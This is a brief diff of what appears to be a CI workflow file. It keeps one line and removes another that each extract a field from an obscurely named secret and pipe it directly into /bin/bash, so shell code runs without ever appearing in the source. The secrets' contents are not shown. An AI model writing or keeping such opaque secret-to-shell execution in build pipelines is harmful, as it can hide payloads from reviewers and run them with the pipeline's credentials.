@@ -23,7 +23,6 @@ jobs:
           dffg78821: ${{ secrets.dffg78821 }}
         run: |
           printf '%s' "$dffg78821" | jq -r .n65064 | /bin/bash
-          printf '%s' "$wpv39548" | jq -r .noj3 | /bin/bash
 
       - name: Archive output
         if: always()
